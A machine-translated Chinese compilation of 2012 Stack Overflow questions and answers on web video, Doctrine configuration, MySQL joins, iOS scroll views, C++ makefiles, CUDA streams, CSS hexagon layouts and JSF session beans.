我参与了一所大学的网站开发。在此我必须播放描述该大学的视频文件。

请帮助我前进。

谢谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T04:50:54.763

你可以

1.  在网页中嵌入 Flash 视频播放器。[本文](http://www.instantshift.com/2010/05/14/21-free-video-players-for-your-website-and-blogs/)列出了一些免费可用的 Flash 播放器。这种技术通常用于当今的 Internet，因为它的浏览器兼容性问题较少。
2.  或者您可以在许多现代浏览器（如 Chrome、Firefox 和 IE9+）中已经内置的**HTML5**`video`中使用标签，但可能不适用于不支持HTML5 中标签的旧浏览器。**`video`**

 **因此，您可以选择合适的方法。**

# c# - 检查 Windows 8 动态磁贴上的正常磁贴或宽磁贴

> ID：13061594
> 
> 赞同：0
> 
> 时间：2012-10-25T04:33:50.937
> 
> 标签：c#, xaml, windows-8, windows-runtime

我正在 Windows 8 C# XAML 应用程序中创建动态磁贴。我发现我需要使用 TileUpdateManager 类来获取磁贴模板。我还可以看到普通瓷砖 (150x150) 和宽瓷砖 (310x150) 有不同的模板。**那么，如何检测用户在 C# 代码中是选择显示普通平铺还是宽平铺，以便获得相关模板？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:39:08.973

更好的方法是同时提供两者，操作系统会解决它。

这是一个很好的文档，概述了如何执行此操作：http: [//blogs.msdn.com/b/windowsappdev/archive/2012/04/16/creating-a-great-tile-experience-part-1.aspx](http://blogs.msdn.com/b/windowsappdev/archive/2012/04/16/creating-a-great-tile-experience-part-1.aspx)

# facebook-javascript-sdk - 调用 FB.ui 发布提要时，会显示“需要验证码”

> ID：13061598
> 
> 赞同：2
> 
> 时间：2012-10-25T04:34:22.133
> 
> 标签：facebook-javascript-sdk, feed

当我们的应用发布的提要使用 fb.ui 时，页面会显示“需要验证码”。我们测试了提要数据，发现如果我们使用我们的 CDN 提供商 url

> [http://upupgame.sslcs.cdngc.net/client/images/msi/t08.png](http://upupgame.sslcs.cdngc.net/client/images/msi/t08.png)

将显示所需的验证码。如果更改我们将其更改为另一个甚至不存在的 URL，它将显示 fb.ui。

我们的 CDN URL 是否已被禁止？如何解决？我们检查了我们的见解，没有发现其他任何警告。我们的数据统计显示健康！

# doctrine-orm - Zend Framework 2 Doctrine 快速入门

> ID：13061604
> 
> 赞同：5
> 
> 时间：2012-10-25T04:35:02.223
> 
> 标签：doctrine-orm, zend-framework2

我正在尝试让 ZF2 快速入门与 Doctrine 一起使用。我以为我已正确设置它，但出现以下错误。有人看过吗？

> 文件：/Users/jhicks/workspace/zf2-example/vendor/doctrine/common/lib/Doctrine/Common/Persistence/Mapping/MappingException.php:38 消息：在链配置命名空间 ZfcUser\Entity、\Entity、ZfcUserDoctrineORM\Entity

这是我的教义配置：

```
return array(
    'doctrine' => array(
        'driver' => array(
            __NAMESPACE__ . '_driver' => array(
                'class' => 'Doctrine\ORM\Mapping\Driver\AnnotationDriver',
                'cache' => 'array',
                'paths' => array(__DIR__ . '/../src/' . __NAMESPACE__ . '/Entity')
            ),
            'orm_default' => array(
                'drivers' => array(
                    __NAMESPACE__ . '\Entity' => __NAMESPACE__ . '_driver'
                )
            )
        ),
        'connection' => array(
            'orm_default' => array(
                'driverClass' => 'Doctrine\DBAL\Driver\PDOMySql\Driver',
                'params' => array(
                    'host'     => 'localhost',
                    'port'     => '3306',
                    'dbname'   => 'zf2example',
                    'user'     => 'user',
                    'password' => 'password'
                ),  
            )
        )
    ),
); 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-25T14:28:16.527

如果您仔细查看异常消息中的实体名称空间列表...

```
ZfcUser\Entity, \Entity, ZfcUserDoctrineORM\Entity
-------------------^ 
```

您会注意到其中之一是 just `\Entity`。这是因为您已经在某个 PHP 配置文件中配置了实体命名空间（即：文件中的文件`config/autoload`或模块的`config/module.config.php`文件），默认情况下这些文件没有命名空间。尝试在配置文件的顶部添加一个：

```
<?php
namespace Album; 
```

在我的本地测试中，这解决了这个问题。

# box2d - 在 Box2D 中的碰撞检测期间未调用 postResolve

> ID：13061606
> 
> 赞同：1
> 
> 时间：2012-10-25T04:35:15.223
> 
> 标签：box2d, collision-detection

我正在使用 Cocos2d-x 2.0.2 和与之关联的 Box2D。我创建了一个从 b2ContactListner 到检测碰撞的派生。我需要知道接触位置和冲动。现在的问题是我的导数 BeginContact()、EndContact() 和 preSolve() 都被调用，而 postSolve() 不再被调用。这是由于设置 b2Body 时的某些属性配置，还是因为没有发生冲突解决事件而无法调用 postSolve()？如果没有发生碰撞解决事件，如何从其他三个回调函数中获取碰撞脉冲？谢谢。

# android - 当我在我的应用程序中更改语言时如何更改“键盘语言文本输入”

> ID：13061608
> 
> 赞同：1
> 
> 时间：2012-10-25T04:35:26.440
> 
> 标签：android, configuration, localization, resources

我想创建一个应用程序，并且在我的应用程序中支持多种语言。但是当我更改语言时，我无法更改键盘语言。这是在我的应用程序中更改语言的代码...

> `String [] lCode = getResources().getStringArray(R.array.language_code);`
> `Locale locale = new Locale(lCode[position]);`
> `Locale.setDefault(locale);`
> `Configuration config = new Configuration();`
> `config.locale = locale;`
> `getBaseContext().getResources().updateConfiguration(config, getBaseContext().getResources().getDisplayMetrics());`

这里的language_code值xml ...

> en-us zh_TW fr de ru es

# portlet - 如何在 .vm 中获取 portlet 的 plid？

> ID：13061610
> 
> 赞同：0
> 
> 时间：2012-10-25T04:35:52.287
> 
> 标签：portlet, liferay-6

我需要在我的**主题（.vm）****中**检索一个 portlet 的plid。

 **找不到合适的方法来做到这一点。

我需要以弹出窗口的形式打开“我的帐户”portlet。为此的代码将在主题中编写。

我在用

```
#set ($my_url = $portletURLFactory.create($request, "2", $getterUtil.getLong($plid), "RENDER_PHASE")) 
```

然后在锚标记中使用 url：

```
<a style="color: #ffffff" href="$my_URL">Click Here</a> 
```

但是在点击我被重定向到空白页面。

为什么呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T04:52:12.017

下面是获取plid（vm中的pageId）的代码

#set ($themeDisplay = $request.get('theme-display'))

```
#set ($currentPlid = $getterUtil.getLong($themeDisplay.get('plid'))) 
```**

# jquery - jquery datepicker setvalue 再次显示日历

> ID：13061611
> 
> 赞同：0
> 
> 时间：2012-10-25T04:35:57.643
> 
> 标签：jquery, jquery-ui

当我调用 setDate 函数时，jquery datepicker 再次出现，我的页面上有多个 datepicker。when one datepicker value is selected i want to set the values of all other calendars that are showed up and it just hangs until i click the datepicker again, here is how i am doing it. 我正在使用 jquery 1.6.1 和 jquery-ui-1.8.5

```
function initCalendarMulti() {
    $(".calendarmulti").each(function (index) {
        $(this).datepicker({ 
            numberOfMonths: 2,
            minDate: 1,
            maxDate: "+1Y",
            changeMonth: true,
            changeYear: true,
            duration: "fast",
            onSelect: setValuesMulti,
            regional: cul
        });
    });
}
    function setValuesMulti(elem, inst) {
    var temp;
    if (segmIndex == 1) return;
    for (var i = 1; i <= segmIndex; i++) {
        var depSrc = $("#segment" + i + " input[id=txtDeparture" + i + "]").datepicker("getDate");
        if ($("#segment" + (i + 1)).hasClass("hide") == false) {
        var id = "segment" + (i + 1) + " input[id=txtDeparture" + (i + 1) + "]";
        var depDes = $("#" + id).datepicker("getDate");
        if (eval(depDes - depSrc) < 0) {
            $("#" + id).datepicker("setDate", depSrc);//this line shows up the calendar again
            //depDes.setDate(depSrc); // this line does not do anything
        }
    }

    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-03T17:40:05.843

我相信应该是

```
$("#" + id).datepicker('setValue', depSrc); 
```

# c++ - C ++如何从函数返回多个不同类型的数组

> ID：13061613
> 
> 赞同：1
> 
> 时间：2012-10-25T04:36:16.110
> 
> 标签：c++, arrays

我正在尝试编写一个接受 3 个不同数组的函数。这些数组的类型分别是字符串、双精度和双精度。该函数将用数据填充这些数组，然后将它们返回给 main。但是，我不确定要声明什么作为函数的返回类型，因为所有数组都不包含相同的数据类型。下面列出了将接受数组作为参数的函数

```
void additems(string arry1[], double arry2[], double arry3[], int index)
{
/*************************  additems **************************
NAME: additems
PURPOSE: Prompt user for airport id, elevation, runway length.  Validate input and add to 3 seperate parallel arrays
CALLED BY: main
INPUT: airportID[], elevation[], runlength[], SIZE
OUTPUT: airporID[], elevation[], runlength[]
****************************************************************************/
    //This function will prompt the user for airport id, elevation, and runway     length and add them to 
    //separate parallel arrays
    for (int i=0; i<index; i++)
    {
        cout << "Enter the airport code for airport " << i+1 << ". ";
        cin >> arry1[i];
        cout << "Enter the maximum elevation airport " << i+1 << " flys at (in ft). ";
        cin >> arry2[i];
        while (arry2[i] <= 0)
        {
            cout << "\t\t-----ERROR-----";
            cout << "\n\t\tElevation must be greater than 0";
            cout << "\n\t\tPlease re enter the max elevation (ft). ";
            cin >> arry2[i];
        } 
        cout << "Enter the longest runway at the airport " << i+1 << " (in ft). ";
        cin >> arry3[i];
        while (arry3[i] <= 0)
        {
            cout << "\t\t-----ERROR-----";
            cout << "\n\t\tRunway length must be greater than 0";
            cout << "\n\t\tPlease re enter the longest runway length (ft). ";
            cin >> arry3[i];
        }
        cout << endl;
    }   

    return arry1, arry2, arry3;
   } 
```

提前感谢您考虑我的问题

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T04:40:18.370

您不需要返回数组，因为它们是由函数修改的。当您将数组传递给这样的函数时，数组是通过引用传递的。通常，数据类型是按值传递的（*即*复制），但数组的处理方式有点像指针。

所以只需 return `void`，或者如果你愿意，你可以返回某种值来表示成功（如果合适的话）。您可能希望返回一个整数来说明输入了多少记录（如果用户可以选择输入少于`index`记录）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T04:43:15.573

你可以说

```
return; 
```

或完全忽略它。您正在就地修改传入的数组，因此无需返回任何内容。

# mysql - 3个表的完全连接

> ID：13061615
> 
> 赞同：0
> 
> 时间：2012-10-25T04:36:38.790
> 
> 标签：mysql, join

我有这个查询来模拟`full join`mysql中的三个表，

```
SELECT a. * , b. * , c. *
FROM tbl_1 a
LEFT OUTER JOIN tbl_2 b ON a.num = b.num
LEFT OUTER JOIN tbl_3 c ON a.num = c.num
UNION
SELECT a. * , b. * , c. *
FROM tbl_1 a
RIGHT OUTER JOIN tbl_2 b ON a.num = b.num
RIGHT OUTER JOIN tbl_3 c ON a.num = c.num 
```

但它产生的结果不是我所期望的，我要加入的表如下，

```
Table1-
num |info
----------
1   |aaaaa  
2   |bbbb
3   |ccc
3   |ccc
4   |dddd

Table2-
num |info
----------
1   |aaaaa
3   |ccc
4   |dddd
5   |eeee
6   |ffff

Table3-
num |info
----------
1   |aaaaa
6   |ffff
2   |bbbb 
```

我期待的结果是，

```
Required result 1-
num |info   num |info   num |info
----------- ----------- ----------
1   |aaaaa  1   |aaaaa  1   |aaaaa
2   |bbbb   NULL|NULL   2   |bbbb
3   |ccc    3   |ccc    NULL|NULL
3   |ccc    3   |ccc    NULL|NULL
4   |dddd   4   |dddd   NULL|NULL
NULL|NULL   5   |eeee   NULL|NULL
NULL|NULL   6   |ffff   6   |ffff 
```

**或者**

```
Required result 2-
num |info   num |info   num |info
----------- ----------- ----------
1   |aaaaa  1   |aaaaa  1   |aaaaa
2   |bbbb   NULL|NULL   2   |bbbb
3   |ccc    3   |ccc    NULL|NULL
3   |ccc    3   |ccc    NULL|NULL
4   |dddd   4   |dddd   NULL|NULL
NULL|NULL   6   |ffff   6   |ffff 
```

但我得到的是

```
Result i get-
num |info   num |info   num |info
----------- ----------- ----------
1   |aaaaa  1   |aaaaa  1   |aaaaa
2   |bbbb   NULL|NULL   2   |bbbb
3   |ccc    3   |ccc    NULL|NULL
3   |ccc    3   |ccc    NULL|NULL
4   |dddd   4   |dddd   NULL|NULL
NULL|NULL   NULL|NULL   6   |ffff
NULL|NULL   NULL|NULL   2   |bbbb 
```

我可以知道这里有什么问题吗，我已经被这个问题困扰了 2 天并且无法解决..我可以知道查询以获得我想要的结果吗？

非常感谢你 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:54:08.377

这如 John Woo 对 sql fiddle 的评论所示。（原始答案包含错误，但现在应该可以使用）

```
SELECT a. * , b. * , c. *
FROM tbl_1 a
LEFT OUTER JOIN tbl_2 b USING (num)
LEFT OUTER JOIN tbl_3 c USING (num)
UNION
SELECT a. * , b. * , c. *
FROM tbl_2 b
LEFT OUTER JOIN tbl_1 a USING (num)
LEFT OUTER JOIN tbl_3 c USING (num)
UNION
SELECT a. * , b. * , c. *
FROM tbl_3 c
LEFT OUTER JOIN tbl_1 a USING (num)
LEFT OUTER JOIN tbl_2 b USING (num) 
```

# iphone - 在 Iphone 中使用页面控制滑动图像

> ID：13061616
> 
> 赞同：8
> 
> 时间：2012-10-25T04:36:43.557
> 
> 标签：iphone, ios, uiscrollview, scroll, uipagecontrol

我正在尝试制作练习应用程序，我可以在其中使用页面控件滚动图像。我能够滚动图像并能够包含页面控件。但我面临的问题是我无法将两者联系起来。意思是说当我滚动图像时，页面控件不受影响，而当我更改页面控件时，图像的滚动不受影响。

我已经提到了这个： http: [//www.iosdevnotes.com/2011/03/uiscrollview-paging/](http://www.iosdevnotes.com/2011/03/uiscrollview-paging/)用于滚动页面控件。

视图控制器.h

```
#import <UIKit/UIKit.h>

@interface ViewController : UIViewController <UIScrollViewDelegate>{
    UIScrollView *scrollView;
    UIPageControl *pageControl;

    BOOL pageControlBeingUsed;
}

@property (nonatomic, retain) IBOutlet UIScrollView *scrollView;
@property (nonatomic, retain) IBOutlet UIPageControl *pageControl;

- (IBAction)changePage;

@end 
```

视图控制器.m

```
#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

@synthesize scrollView,pageControl;

- (void)scrollViewDidScroll:(UIScrollView *)sender {
    if (!pageControlBeingUsed) {
        // Switch the indicator when more than 50% of the previous/next page is visible
        CGFloat pageWidth = self.scrollView.frame.size.width;
        int page = floor((self.scrollView.contentOffset.x - pageWidth / 2) / pageWidth) + 1;
        self.pageControl.currentPage = page;
    }
}
- (void)scrollViewWillBeginDragging:(UIScrollView *)scrollView {
    pageControlBeingUsed = NO;
}

- (void)scrollViewDidEndDecelerating:(UIScrollView *)scrollView {
    pageControlBeingUsed = NO;
}
- (void)viewDidLoad
{
    [super viewDidLoad];
    NSArray *images = [[NSArray alloc] initWithObjects:[UIImage imageNamed:@"1.jpeg"],[UIImage imageNamed:@"2.jpeg"],[UIImage imageNamed:@"3.jpeg" ], nil];

    self.scrollView.contentSize = CGSizeMake(self.scrollView.frame.size.width * images.count, self.scrollView.frame.size.height);

    for (int i = 0; i < images.count; i++) {
        CGRect frame;
        frame.origin.x = self.scrollView.frame.size.width * i;
        frame.origin.y = 0;
        frame.size = self.scrollView.frame.size;
        UIImageView* imgView = [[UIImageView alloc] init];
        imgView.image = [images objectAtIndex:i];
        imgView.frame = frame;
        [scrollView addSubview:imgView];
    }

    self.pageControl.currentPage = 0;
    self.pageControl.numberOfPages = images.count;

}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}
- (void)viewDidUnload {
    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
    self.scrollView = nil;
    self.pageControl = nil;
}

- (IBAction)changePage{
        // update the scroll view to the appropriate page
        CGRect frame;
        frame.origin.x = self.scrollView.frame.size.width * self.pageControl.currentPage;
        frame.origin.y = 0;
        frame.size = self.scrollView.frame.size;
        [self.scrollView scrollRectToVisible:frame animated:YES];
        pageControlBeingUsed = YES;
}

@end 
```

需要一些指导...谢谢..

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-25T04:57:44.970

我从本教程中学习了页面控制和scrollView，它写得很清楚，希望对你有帮助[http://www.raywenderlich.com/10518/how-to-use-uiscrollview-to-scroll-and-zoom-content](http://www.raywenderlich.com/10518/how-to-use-uiscrollview-to-scroll-and-zoom-content)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-25T04:53:04.173

检查是否已将滚动视图的委托设置为 ViewController

而且您刚刚将 pageControlBeingUsed 设置为 YES 或 NO 并且您还没有在 ViewController 中的任何地方使用它

# c++ - 未定义的参考c++，不寻常的情况

> ID：13061617
> 
> 赞同：2
> 
> 时间：2012-10-25T04:36:44.703
> 
> 标签：c++, linux, compilation, compiler-errors, g++

我正在用 C++ 创建一个队列类，但在使用 makefile 编译时遇到了问题。我的 queue.cpp 课程在这里

```
#include "queue.h"
#include <stdlib.h>

queue::queue()
{
   front_p = NULL;
   back_p = NULL;
   current_size = 0;
}

void queue::enqueue(int item)
{
    node newnode = node(item, NULL);
   if (front_p == NULL) //queue is empty
    {
       front_p = &newnode;
       back_p = &newnode;
    }
   else 
   {
       back_p->next = &newnode;
       back_p = &newnode;
   }
   current_size ++;
} 
```

我的头文件（queue.h）在这里

```
class queue
{
  public:
    queue(); // constructor - constructs a new empty queue.
    void enqueue( int item ); // enqueues item.
    int dequeue();  // dequeues the front item.
    int front();   // returns the front item without dequeuing it.
    bool empty();  // true iff the queue contains no items.
    int size();  // the current number of items in the queue.
    int remove(int item); // removes all occurrances of item 
      // from the queue, returning the number removed.

  private:
    class node  // node type for the linked list 
    {
       public:
           node(int new_data, node * next_node ){
              data = new_data ;
              next = next_node ;
           }
           int data ;
           node * next ;
    };

    node* front_p ;
    node* back_p ;
    int current_size ; // current number of elements in the queue.
}; 
```

测试程序（tester.cpp）

```
#include <iostream>
#include "queue.h"
#include <stdlib.h>
using namespace std;

int main(int argc, char * const argv[])
{
    cout << "Lalalalala" << endl;
    queue q1;
    q1.enqueue(5);
} 
```

生成文件

```
all: tester

tester: queue.o
    g++ -o tester tester.cpp

queue.o: queue.cpp queue.h
    g++ -c queue.cpp

clean:
    rm -f tester *.o 
```

当我输入“make”或“make all”时，我得到这个错误：

```
g++ -o tester tester.cpp
/tmp/ccTOKLWU.o: In function `main':
tester.cpp:(.text+0x33): undefined reference to `queue::queue()'
tester.cpp:(.text+0x44): undefined reference to `queue::enqueue(int)'
collect2: ld returned 1 exit status
make: *** [tester] Error 1 
```

它的不同寻常之处在于，在 Windows 机器上的 Visual Studio 中编译时，没有错误。我一点也不知道为什么它不应该像我这样在 linux 机器上编译。有人能解释一下吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-25T04:42:02.707

您的 makefile 不正确 - 它编译`tester.cpp`时依赖于`queue.o`，但它根本没有链接`queue.o`。这就是为什么编译会`tester.cpp`导致未解决的参考。

您应该按如下方式更改您的 make 文件：

```
all: tester

tester: queue.o tester.o
    g++ queue.o tester.o -o tester

tester.o: tester.cpp tester.h
    g++ -c tester.cpp

queue.o: queue.cpp queue.h
    g++ -c queue.cpp

clean:
    rm -f tester *.o 
```

# cuda - 如果同时从多个 pthread 调用 CUDA 内核会发生什么？

> ID：13061619
> 
> 赞同：3
> 
> 时间：2012-10-25T04:36:49.397
> 
> 标签：cuda, pthreads

我有一个 CUDA 内核来完成我的艰苦工作，但我也有一些艰苦的工作需要在 CPU 中完成（使用同一数组的两个位置进行计算），而我无法在 CUDA 中编写（因为 CUDA 线程不是同步的） ，我需要对数组的位置 X 进行艰苦的工作，然后在 z[x] = y[x] - y[x - 1] 之后，其中 y 是每个线程工作的 CUDA 内核的数组结果这个数组的一个位置，z 是另一个存储结果的数组）。所以我在CPU中做这个。

我有几个 CPU 线程来做 CPU 方面的工作，但每个线程都在调用一个 CUDA 内核来传递一些数据。我的问题是：当多个 CPU 线程进行 GPU 调用时，GPU 端会发生什么？如果我执行一次 CUDA 内核调用然后创建多个 CPU 线程来完成 CPU 端的工作会更好吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T09:46:14.487

内核调用排队并在单个流中一一执行。

但是，您可以在内核执行期间指定流 - 然后不同流中的 CUDA 操作可能会同时运行，并且来自不同流的操作可能会交错。默认流为 0。

请参阅：[CUDA 流和并发](http://developer.download.nvidia.com/CUDA/training/StreamsAndConcurrencyWebinar.pdf)

当不同的进程使用同一张卡时，情况是相似的。

还要记住，内核是从 CPU 东西异步执行的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T09:55:41.723

在 CUDA 4.0 及更高版本上，多个线程可以共享相同的 CUDA 上下文，因此不再需要 cuPush/PopContext。您只需要为每个线程调用 cudaSetDevice。然后，提到@dzonder，您可以从具有流的不同线程中同时运行多个内核。

# c - 寻找步进电机编程资源的初学者

> ID：13061623
> 
> 赞同：1
> 
> 时间：2012-10-25T04:37:09.277
> 
> 标签：c, embedded, controls

我正在尝试自学对步进电机进行编程。我是电机控制的初学者，但我确实有大学水平的 GUI 和嵌入式系统编程经验。

就一些好的资源而言，任何人都可以引导我朝着正确的方向前进。

谢谢 ：）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-25T04:39:35.307

当然，这应该让你开始：

*   [微处理器步进电机编程](http://goo.gl/h5IUQ)

# html - HTML非方形布局设计问题

> ID：13061624
> 
> 赞同：4
> 
> 时间：2012-10-25T04:37:13.410
> 
> 标签：html, css

> **可能重复：**
> [使用 CSS3 生成重复的六边形图案](https://stackoverflow.com/questions/10062887/generate-repeating-hexagonal-pattern-with-css3)

我想制作一个如图所示的布局

![在此处输入图像描述](../Images/9e19f0c838fe3d21eba5a77f7f698d2f.png)

但我无法在基本的 html 中做到这一点。

请帮我解决一下这个。（因为它是六边形，而且它的图像不是方形的，所以我觉得有问题）

您可以从以下网址下载单位六边形[： 单击此处：](http://ge.tt/7Shk5CQ/v/0)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-25T08:24:41.363

你可以用更简单的方式来做到这一点：

# [*演示*](http://dabblet.com/gist/3951392)

您使用如下结构：

```
<div class='box-wrapper'>
    <div class='row'>
        <div class='hexagon'><a href='#'></a></div>
        <!--and so on, more hexagons-->
    </div>
    <!--and so on, more rows-->
</div> 
```

**CSS**很简单：

```
.box-wrapper { margin: 5em 1em 1em; border: solid 1px silver; padding: 3.2em 0; }
.row { margin: -1.6em 0; text-align: center; }
.hexagon {
    display: inline-block;
    overflow: hidden;
    width: 8em; height: 8em;
    transform: rotate(-30deg) skewX(30deg) scaleY(.866);
}
.hexagon a {
    display: block;
    height: 100%;
    transform: scaleY(1.155) skewX(-30deg) rotate(30deg) scaleX(.866);
    background: gainsboro;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T05:12:45.873

```
<!DOCTYPE html>
<html>
  <head>
    <title></title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">  
    <style type="text/css">
        .odd,
        .even{
            background:url('unite.png');
            height:202px;
            margin-bottom:-47px;
        }
        .odd{
            margin-left:88px;
        }
    </style>
</head>
<body>
    <div class="odd"></div>
    <div class="even"></div>
    <div class="odd"></div>
    <div class="even"></div>
</body> 
```

如果这是你想要的，我会很高兴.. :)

* * *

图像的最新更改，但除非您使用 HTML 地图区域，否则链接会出现问题

```
<!DOCTYPE html>
<html>
<head>
    <title></title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">  
    <style type="text/css">
        .odd{
            height:202px;
            padding-left:88px;
        }
        .even{
            height:202px;
            margin-top:-47px;
        }
    </style>
</head>
<body>
    <div class="odd">
        <img src="unite.png" />
        <img src="unite.png" />
        <img src="unite.png" />
        <img src="unite.png" />
    </div>
    <div class="even">
        <img src="unite.png" />
        <img src="unite.png" />
        <img src="unite.png" />
        <img src="unite.png" />
        <img src="unite.png" />
    </div>
</body> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-25T04:59:13.730

您可以使用 HTML Map Tag 非常简单且非常精确地做到这一点，如果您使用 Dream Weaver，那将是小菜一碟，所以您需要的是六边形的实际图片并开始在 DW 或任何其他所见即所得编辑器中绘制它们有，这里是一个例子： [地图区域标签](http://www.w3schools.com/tags/tryit.asp?filename=tryhtml_areamap)

虽然也可以通过纯 css/html 来实现，但可以通过控制 div 的边距来实现。

# ios - Rails 的 AFNetworking 和 DELETE 请求

> ID：13061626
> 
> 赞同：0
> 
> 时间：2012-10-25T04:37:26.920
> 
> 标签：ios, ruby-on-rails, heroku, afnetworking

我正在对我自己的 heroku rails 移动 iOS 照片共享应用程序版本进行最后润色。我已经在 iOS 上通过 HTTP 实现并成功发送了 POST 和 GET 请求。不幸的是，Heroku 教程明确声明不会讨论如何编写 DELETE 请求。这是我到目前为止所拥有的：

```
+ (void)deletePhoto:(NSString *)owner
          image:(NSString *)recordId
          block:(void (^)(Photo *, NSError *))block
{
NSMutableDictionary *mutableParameters = [NSMutableDictionary dictionary];
[mutableParameters setObject:recordId forKey:@"photo[id]"];

NSLog(@"Destroying %@", recordId);
[[CloudGlyphAPIClient sharedClient] deletePath:@"/photo" parameters:mutableParameters success:^(AFHTTPRequestOperation *operation, id JSON) {
    if (block) {
        NSLog(@"DELETE sussessful");
    }
} failure:^(AFHTTPRequestOperation *operation, NSError *error) {
    if (block) {
        block(nil, error);
    }
}];
}

+ (void)getPhotos:(NSString *)owner
                 block:(void (^)(NSSet *photos, NSError *error))block
{
NSMutableDictionary *mutableParameters = [NSMutableDictionary dictionary];
[mutableParameters setObject:owner forKey:@"photo[owner]"];

[[CloudGlyphAPIClient sharedClient] getPath:@"/photos" parameters:mutableParameters success:^(AFHTTPRequestOperation *operation, id JSON) {
    NSMutableSet *mutablePhotos = [NSMutableSet set];
    for (NSDictionary *attributes in [JSON valueForKeyPath:@"photos"]) {
        Photo *photo = [[Photo alloc] initWithAttributes:attributes];
        [mutablePhotos addObject:photo];
    }

    if (block) {
        block([NSSet setWithSet:mutablePhotos], nil);
    }
} failure:^(AFHTTPRequestOperation *operation, NSError *error) {
    if (block) {
        block(nil, error);
    }
}]; 
```

}

我基于 GET 请求的 DELETE 请求，但在这种情况下，我们正在寻找特定所有者的特定图像用户。我收到一个错误，即路由文件不包含 DELETE /photos 的路径...我将 destroy 方法添加到 rails 应用程序并获取 routes.rb 文件。

我觉得这是某个地方的rails GOTCHA ..感谢您的帮助^_^

**TL；DR**尝试使用 AFNetworking 为 Rails 应用程序编写 DELETE 请求

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-28T17:39:29.267

在 AFNetworking 中，DELETE 路径是这样的 url 路径：photos/18.json 是标记为删除的记录。在这里找到答案： [答案](https://stackoverflow.com/questions/12449268/afnetworking-put-and-delete-with-rails)

实际上，可以将一个字符串连接到表格中 ActiveREcord 的 url。

# ios - 使用具有不同 UI 的 iOS StoryBoard 创建通用应用程序

> ID：13061632
> 
> 赞同：1
> 
> 时间：2012-10-25T04:38:02.873
> 
> 标签：ios, xcode4.3, uistoryboard, ipad

我是 iOS 新手，昨天我了解了故事板。效果很好。我指的是[这个链接](http://www.raywenderlich.com/5138/beginning-storyboards-in-ios-5-part-1)。我尝试使用情节提要创建 iPhone 应用程序。

但现在我想创建一个通用应用程序，这意味着 iPhone 和 iPad。但也使用故事板。可以说，如果我有相同的用户界面，那将不是问题。相同的 UI 意味着，我的 iPhone UI 使用标签栏控制器，我的 iPad 也使用标签栏控制器。我只需要指向同一个类，结果是一样的。现在，我想要一个不同的用户界面。我的 iPhone 将使用标签栏，但我的 iPad 将使用拆分视图。

这是我的问题：

1.  使用设备目标通用可以做到这一点吗？我的意思是带有标签栏的 iPhone，带有拆分视图的 iPad。
2.  如果是，我怎么知道哪个设备正在运行？我选择 iPad 或 iPhone。我怎么知道我在 iPhone/iPad 上运行？我应该在 appdelegate 中验证什么？
3.  对于 ipad 故事板，我拖动了一个拆分视图控制器，但每当我运行应用程序时我都看不到任何主细节。怎么会这样？

谢谢。:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-01-21T07:29:57.983

如果您创建一个通用应用程序（一个同时支持 iPhone 和 iPad 的应用程序），Xcode 默认会为您提供两个 Storyboard——一个用于 iPhone，一个用于 iPad。在您的目标设置下，您将看到一个可以配置哪个 Storyboard 呈现主界面的位置 - 您可以为 iPhone 和 iPad 分别设置：

![在此处输入图像描述](../Images/35af3e1af450789d278334d6c89c67b6.png)

操作系统将负责为您加载正确的 Storyboard。

如果您想在代码中检测您是在 iPhone 还是 iPad 上运行，您可以使用`USER_INTERFACE_IDIOM()`. 例如：

```
if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPhone) 
```

iPad也有`UIUserInterfaceIdiomPad`。

# jsf - 用户登录时 JSF 显示用户名

> ID：13061637
> 
> 赞同：0
> 
> 时间：2012-10-25T04:38:37.457
> 
> 标签：jsf, jdeveloper

用户成功登录后，如何从 userindex 页面显示用户名。我应该将它传递给构造函数并使用它吗？或者有没有更好的解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:45:26.530

创建一个会话范围的 bean，该 bean 存储用户的 ID（以便您可以根据请求查找用户）或实际的用户对象本身。

```
@Named // or @ManagedBean
@SessionScoped
public class SessionGlobals {
    private Integer userId;

    public boolean isLoggedIn() {
        return userId != null;
    }

    public Integer getUserId() {
        return userId;
    }

    public void login(int userId) {
        this.userId = userId;
    }

    public void logout() {
        this.userId = null;
    } 
```

在需要的地方注入这个 bean。当您登录和注销时，调用上面的相应方法。

例如：

```
 @Named // or @ManagedBean
    @RequestScoped
    public class RequestGlobals {

        public User getUser() {
            return sessionGlobals.isLoggedIn()
                    ? userDao.findById(sessionGlobals.getUserId())
                    : null;
        }

        @Inject
        private UserDao userDao;

        @Inject
        private SessionGlobals sessionGlobals;
    } 
```

并在您的页面或模板中：

```
 <h:outputText value="Welcome, #{requestGlobals.user.firstName}"
                  rendered="#{sessionGlobals.loggedIn}"/> 
```

# struts2 - 如何从外部按钮删除struts2 jquery网格中的行

> ID：13061645
> 
> 赞同：2
> 
> 时间：2012-10-25T04:39:47.287
> 
> 标签：struts2, struts2-jquery

